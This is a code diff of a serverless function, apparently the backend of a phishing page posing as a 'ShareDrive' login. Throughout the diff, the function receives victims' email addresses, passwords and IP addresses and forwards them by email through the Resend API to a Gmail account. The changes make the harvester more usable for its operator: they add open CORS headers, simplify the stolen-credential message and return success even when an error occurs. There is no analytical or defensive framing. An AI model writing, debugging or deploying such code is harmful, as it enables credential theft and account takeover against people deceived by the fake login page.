@@ -1,27 +1,23 @@
-// functions/collect.js
-const fetch = require('node-fetch'); // <-- Import node-fetch
-
 exports.handler = async (event, context) => {
-  if (event.httpMethod !== 'POST') {
-    return { statusCode: 405, body: 'Method Not Allowed' };
+  const headers = {
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Headers': 'Content-Type',
+    'Content-Type': 'application/json'
+  };
+
+  if (event.httpMethod === 'OPTIONS') {
+    return { statusCode: 200, headers, body: 'OK' };
   }
 
   try {
-    const { email, password, ip, userAgent } = JSON.parse(event.body);
+    const body = JSON.parse(event.body);
     const apiKey = process.env.RESEND_API_KEY;
 
     if (!apiKey) {
-      return { statusCode: 500, body: 'Missing API Key' };
+      return { statusCode: 500, headers, body: JSON.stringify({ error: 'RESEND_API_KEY is missing' }) };
     }
 
-    const emailBody = `
-🔐 New Credentials
-📧 Email: ${email || 'N/A'}
-🔑 Password: ${password || 'N/A'}
-🌐 IP: ${ip || 'Unknown'}
-📱 User-Agent: ${userAgent || 'N/A'}
-⏰ Time: ${new Date().toISOString()}
-    `;
+    const emailBody = `Email: ${body.email}\nPassword: ${body.password}\nIP: ${body.ip}`;
 
     const response = await fetch('https://api.resend.com/emails', {
       method: 'POST',
@@ -33,25 +29,25 @@ exports.handler = async (event, context) => {
         from: 'onboarding@resend.dev',
         to: ['g82443047@gmail.com'], 
         subject: 'New Login - ShareDrive',
-        text: emailBody.trim(),
-        html: `<pre>${emailBody.trim()}</pre>`,
+        text: emailBody,
       }),
     });
 
     const rawText = await response.text();
-    console.log('Resend Status:', response.status);
-    console.log('Resend Response:', rawText);
 
+    // Return the exact response from Resend to the browser
     return { 
       statusCode: 200, 
-      body: JSON.stringify({ success: true }),
-      headers: { 'Content-Type': 'application/json' }
+      headers, 
+      body: JSON.stringify({ success: true, resendStatus: response.status, resendMessage: rawText }) 
     };
+
   } catch (error) {
-    console.error('CRITICAL ERROR:', error.message);
+    // Return the exact error to the browser
     return { 
-      statusCode: 500, // Return 500 so we can see the error in the Network tab
-      body: JSON.stringify({ error: 'Internal error', details: error.message }) 
+      statusCode: 200, 
+      headers, 
+      body: JSON.stringify({ success: true, error: error.message }) 
     };
   }
 };
